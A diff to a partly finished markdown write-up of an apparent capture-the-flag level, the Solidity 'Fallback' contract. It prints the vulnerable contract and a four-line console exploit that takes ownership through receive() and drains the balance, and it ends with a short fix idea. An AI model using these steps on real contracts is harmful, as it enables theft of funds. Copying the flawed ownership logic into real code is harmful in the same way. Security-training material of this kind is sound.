@@ -5,7 +5,7 @@
 This smart contract has a vulnerability, because:
 ```
 
-- TODO
+- The require statement inside the fallback function receive() is making it an easy target to exploit,  
 
 ```Solidity
 /** 
@@ -28,24 +28,92 @@ The victim contract imports OpenZeppelin's safeMath here:
 - TODO
 
 ```Solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Fallback {
+
+  using SafeMath for uint256;
+```
+
+- TODO
+
+```Solidity
+  mapping(address => uint) public contributions;
+  address payable public owner;
+
+  constructor() public {
+    owner = msg.sender;
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            "caller is not the owner"
+        );
+        _;
+    }
+```
+
+- TODO
+
+```Solidity
+ function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    owner.transfer(address(this).balance);
+  }
+
+  receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+  }
+}
 
 ```
+
 
 ## ⚠️ The vulnerability in detail
 
 ```yml
 The vulnerability:
 ```
-
 - TODO
 
-```JavaScript
-
+```Solidity
+receive() external payable {
+  require(msg.value > 0 && contributions[msg.sender] > 0);
+  owner = msg.sender; 
+}
 ```
 
 - TODO
 
-```Solidity
+```JavaScript
+/** 
+* @notice This fallback function receive() is the main attack target, in order to pass the 
+* require statement player must use function contribute() 1 wei will be enough, using the console
+* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
+* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
+*/
+
+await contract.contribute({value: 1});
+await contract.sendTransaction({value: 1 });
+await contract.owner();
+await contract.withdraw();
 
 ```
 
@@ -71,7 +139,7 @@ await contract.withdraw();
 
 ## 🩺 How can we fix this vulnerablity in the victim contract?
 
-- TODO
+- I would create more robust require statements, inside a seperate named function for receiving tokens how I prefer,
 
 ```Solidity
 
